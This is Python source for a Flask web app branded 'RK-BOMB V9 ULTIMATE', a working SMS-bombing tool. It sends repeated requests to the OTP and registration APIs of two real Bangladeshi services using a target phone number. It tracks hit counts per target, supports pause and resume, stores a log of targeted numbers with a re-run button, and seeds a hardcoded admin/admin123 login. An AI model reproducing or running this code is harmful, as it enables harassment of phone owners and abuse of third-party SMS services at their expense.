import requests
import threading
import os
import time
import sqlite3
import random
from datetime import datetime, timedelta, timezone
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.secret_key = os.urandom(32)

# ---------- [FEATURE: BST BD TIME ZONE] ----------
def get_bd_time():
    return datetime.now(timezone(timedelta(hours=6)))

# ---------- [DATABASE SETUP] ----------
def get_db():
    conn = sqlite3.connect('rk_v9_ultimate.db', check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as conn:
        conn.execute('''CREATE TABLE IF NOT EXISTS history (
            id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, phone TEXT, 
            success INTEGER, fail INTEGER, total INTEGER, limit_amt INTEGER, 
            status TEXT, start_time TEXT, stop_time TEXT, duration TEXT, 
            date_str TEXT, timestamp DATETIME)''')
        conn.execute("CREATE TABLE IF NOT EXISTS users (username TEXT UNIQUE, password TEXT, status TEXT)")
        try:
            conn.execute("INSERT INTO users VALUES (?, ?, ?)", ("admin", generate_password_hash("admin123"), "active"))
        except: pass

init_db()

# ---------- [CORE TURBO ENGINE WITH PAUSE/RESUME LOGIC] ----------
active_sessions = {}

def send_request(phone):
    api_list = [
        "https://shop.pharmaid-rx.com/api/sendSMSRegistration?mobileNumber={}",
        "https://redx.com.bd/api/v1/user/otp?phone={}"
    ]
    try:
        res = requests.get(random.choice(api_list).format(phone), timeout=6)
        return res.status_code == 200
    except:
        return False

def bombing_task(username, phone, limit, start_dt):
    key = f"{username}_{phone}"
    
    with ThreadPoolExecutor(max_workers=5) as executor:
        while key in active_sessions:
            curr = active_sessions[key]
            if curr['total'] >= curr['limit'] or curr['status'] == 'Stopped': 
                break
            
            # [FEATURE: PAUSE LOGIC]
            if curr['status'] == 'Running':
                now = get_bd_time()
                elapsed = now - start_dt
                active_sessions[key]['running_time'] = str(elapsed).split('.')[0]

                future = executor.submit(send_request, phone)
                if future.result():
                    active_sessions[key]['success'] += 1
                else:
                    active_sessions[key]['fail'] += 1
                
                active_sessions[key]['total'] += 1
                
                # [FEATURE: DYNAMIC ETA]
                if active_sessions[key]['total'] > 1:
                    avg_speed = elapsed.total_seconds() / active_sessions[key]['total']
                    rem = active_sessions[key]['limit'] - active_sessions[key]['total']
                    active_sessions[key]['eta'] = str(timedelta(seconds=int(avg_speed * rem)))
                
                time.sleep(0.2) 
            else:
                # When Paused, wait without sending requests
                time.sleep(1)

    # Mission Completion & Saving Log
    stop_dt = get_bd_time()
    duration = str(stop_dt - start_dt).split('.')[0]
    s = active_sessions.get(key)
    if s and s['status'] != 'Paused':
        with get_db() as conn:
            conn.execute('''INSERT INTO history 
                (username, phone, success, fail, total, limit_amt, status, start_time, stop_time, duration, date_str, timestamp) 
                VALUES (?,?,?,?,?,?,?,?,?,?,?,?)''',
                (username, phone, s['success'], s['fail'], s['total'], s['limit'], "Completed", 
                 s['start_time'], stop_dt.strftime("%I:%M %p"), duration, start_dt.strftime("%d/%m/%Y"), start_dt))
        del active_sessions[key]

# ---------- [FEATURE: CYBER-GLOW UI WITH ALL BUTTONS] ----------
LAYOUT = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RK-BOMB V9 ULTIMATE</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    <style>
        :root { --neon: #00ffcc; --bg: #010101; --card: #080808; --red: #ff0055; --blue: #00ccff; --gold: #ffcc00; --gray: #222; }
        body { background: var(--bg); color: #fff; font-family: 'Rajdhani', sans-serif; margin: 0; }
        .nav { background: #000; padding: 15px 25px; border-bottom: 2px solid var(--neon); display: flex; justify-content: space-between; align-items: center; position: sticky; top:0; z-index:1000; }
        .logo { font-family: 'Orbitron'; font-weight: 900; color: var(--neon); text-shadow: 0 0 10px var(--neon); }
        .container { padding: 20px; max-width: 500px; margin: auto; }

        .monitor-frame {
            position: relative; background: #000; border-radius: 15px; padding: 3px; overflow: hidden; margin-bottom: 25px; box-shadow: 0 10px 40px rgba(0,0,0,0.9);
        }
        .monitor-frame::before {
            content: ""; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
            background: conic-gradient(var(--neon), var(--blue), var(--red), var(--gold), var(--neon));
            animation: rotate 3s linear infinite;
        }
        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        .monitor-content { position: relative; background: var(--card); border-radius: 12px; padding: 20px; z-index: 2; }

        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; }
        .info-box { background: rgba(255,255,255,0.03); border: 1px solid #222; padding: 12px; border-radius: 8px; text-align: center; }
        .info-box span { display: block; font-size: 10px; color: #666; font-weight: bold; text-transform: uppercase; }
        .info-box b { font-family: 'Orbitron'; font-size: 1.2rem; color: #fff; }

        input { width: 100%; padding: 15px; margin: 10px 0; background: #000; border: 1px solid #333; color: var(--neon); border-radius: 10px; font-family: 'Orbitron'; box-sizing: border-box; outline: none; border-left: 3px solid var(--neon); }
        .btn-turbo { background: linear-gradient(90deg, var(--neon), var(--blue)); color: #000; border: none; padding: 16px; width: 100%; border-radius: 10px; font-family: 'Orbitron'; font-weight: 900; cursor: pointer; transition: 0.3s; text-transform: uppercase; }
        .btn-turbo:hover { box-shadow: 0 0 25px var(--neon); transform: translateY(-2px); }

        .btn-ctrl { flex: 1; padding: 10px; border: none; border-radius: 8px; font-family: 'Orbitron'; font-size: 10px; font-weight: 900; cursor: pointer; text-transform: uppercase; transition: 0.2s; }
        .bg-pause { background: var(--gold); color: #000; }
        .bg-stop { background: var(--red); color: #fff; }

        .progress-bar { height: 6px; background: #111; border-radius: 3px; margin: 15px 0; overflow: hidden; }
        .progress-fill { height: 100%; background: linear-gradient(90deg, var(--blue), var(--neon)); transition: 0.4s linear; }
        .timer-sec { display: flex; justify-content: space-between; font-family: 'Orbitron'; font-size: 0.75rem; color: var(--gold); }
    </style>
</head>
<body>
    <audio id="snd_start" src="https://assets.mixkit.co/active_storage/sfx/2571/2571-preview.mp3"></audio>

    <nav class="nav">
        <div class="logo">RK-ULTIMATE V9</div>
        <div style="font-size: 12px; font-family: 'Orbitron';">
            <a href="/dashboard" style="color:#fff; text-decoration:none;">COMMAND</a> | 
            <a href="/history" style="color:#fff; text-decoration:none; margin-left:10px;">LOGS</a>
        </div>
    </nav>

    <div class="container">[CONTENT]</div>

    <script>
        function playStart() { document.getElementById('snd_start').play(); }
        function sync() {
            let area = document.getElementById('live-engine');
            if(!area) return;
            fetch('/api/status').then(r=>r.json()).then(data=>{
                let html = '';
                for(let k in data){
                    let s = data[k];
                    let p = (s.total/s.limit)*100;
                    html += `
                    <div class="monitor-frame">
                        <div class="monitor-content">
                            <div style="display:flex; justify-content:space-between; align-items:center;">
                                <b style="color:var(--blue); font-family:'Orbitron';">🛰 TARGET: ${s.phone}</b>
                                <span style="background:${s.status==='Running'?'var(--neon)':'var(--gold)'}; color:#000; padding:2px 8px; border-radius:4px; font-size:9px; font-weight:bold;">${s.status}</span>
                            </div>
                            <div class="progress-bar"><div class="progress-fill" style="width:${p}%"></div></div>
                            <div class="timer-sec">
                                <span>⏱ ELAPSED: ${s.running_time}</span>
                                <span style="color:var(--neon)">⏳ ETA: ${s.eta}</span>
                            </div>
                            <div class="info-grid">
                                <div class="info-box"><span>SUCCESS</span><b style="color:var(--neon)">${s.success}</b></div>
                                <div class="info-box"><span>FAILED</span><b style="color:var(--red)">${s.fail}</b></div>
                                <div class="info-box"><span>HITS DONE</span><b>${s.total}/${s.limit}</b></div>
                                <div class="info-box"><span>BD TIME</span><b style="font-size:0.8rem;">${s.start_time}</b></div>
                            </div>
                            <div style="display:flex; gap:10px; margin-top:15px;">
                                <button class="btn-ctrl bg-pause" onclick="location.href='/api/control?num=${s.phone}&action=${s.status==='Running'?'Paused':'Running'}'">${s.status==='Running'?'PAUSE MISSION':'RESUME MISSION'}</button>
                                <button class="btn-ctrl bg-stop" onclick="location.href='/api/stop?num=${s.phone}'">TERMINATE</button>
                            </div>
                        </div>
                    </div>`;
                }
                area.innerHTML = html;
            });
        }
        setInterval(sync, 1500);
    </script>
</body>
</html>
'''

# ---------- [ROUTES & BACKEND LOGIC] ----------
@app.route('/')
def root(): return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        u, p = request.form.get('u'), request.form.get('p')
        with get_db() as conn:
            user = conn.execute("SELECT * FROM users WHERE username=?", (u,)).fetchone()
        if user and check_password_hash(user['password'], p):
            session['user'] = u
            return redirect(url_for('dashboard'))
    return render_template_string(LAYOUT.replace('[CONTENT]', '<div class="monitor-frame"><div class="monitor-content" style="text-align:center;"><h3>SYSTEM ACCESS</h3><form method="POST"><input name="u" placeholder="ID"><input name="p" type="password" placeholder="Key"><button class="btn-turbo">ENTER CORE</button></form></div></div>'))

@app.route('/dashboard')
def dashboard():
    if 'user' not in session: return redirect(url_for('login'))
    return render_template_string(LAYOUT.replace('[CONTENT]', '''
        <div class="monitor-frame">
            <div class="monitor-content">
                <h3 style="margin:0 0 15px 0; font-family:'Orbitron'; color:var(--neon);">🚀 MISSION CONTROL</h3>
                <form action="/api/start" onsubmit="playStart()">
                    <input name="num" placeholder="Phone Number" required>
                    <input name="amt" type="number" placeholder="Hit Limit" required>
                    <button class="btn-turbo">INITIALIZE TURBO</button>
                </form>
            </div>
        </div>
        <div id="live-engine"></div>
    '''))

@app.route('/history')
def history():
    if 'user' not in session: return redirect(url_for('login'))
    with get_db() as conn:
        logs = conn.execute("SELECT phone, SUM(success) as ok, COUNT(*) as sessions FROM history GROUP BY phone ORDER BY id DESC").fetchall()
    html = '<h3 style="font-family:Orbitron; color:var(--blue);">📂 MISSION DATABASE</h3>'
    for l in logs:
        html += f'<div class="monitor-frame"><div class="monitor-content" style="display:flex; justify-content:space-between; align-items:center;"><div><b>{l["phone"]}</b><br><small>Hits: {l["ok"]}</small></div><button class="btn-turbo" style="width:auto; padding:5px 15px; font-size:10px;" onclick="location.href=\'/api/start?num={l["phone"]}&amt=100\'">RE-RUN</button></div></div>'
    return render_template_string(LAYOUT.replace('[CONTENT]', html))

@app.route('/api/start')
def api_start():
    u, num, amt = session.get('user'), request.args.get('num'), request.args.get('amt')
    if u and num and amt:
        now = get_bd_time()
        active_sessions[f"{u}_{num}"] = {
            'phone': num, 'success': 0, 'fail': 0, 'total': 0, 'limit': int(amt), 
            'status': 'Running', 'start_time': now.strftime("%I:%M %p"), 'running_time': '0:00:00', 'eta': 'Calculating...'
        }
        threading.Thread(target=bombing_task, args=(u, num, int(amt), now), daemon=True).start()
    return redirect(url_for('dashboard'))

@app.route('/api/status')
def api_status():
    u = session.get('user', '')
    return jsonify({k: v for k, v in active_sessions.items() if k.startswith(u)})

@app.route('/api/control')
def api_control():
    key = f"{session.get('user')}_{request.args.get('num')}"
    if key in active_sessions:
        active_sessions[key]['status'] = request.args.get('action')
    return redirect(url_for('dashboard'))

@app.route('/api/stop')
def api_stop():
    key = f"{session.get('user')}_{request.args.get('num')}"
    if key in active_sessions: active_sessions[key]['status'] = 'Stopped'
    return redirect(url_for('dashboard'))

@app.route('/logout')
def logout(): session.clear(); return redirect(url_for('login'))

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=54300)
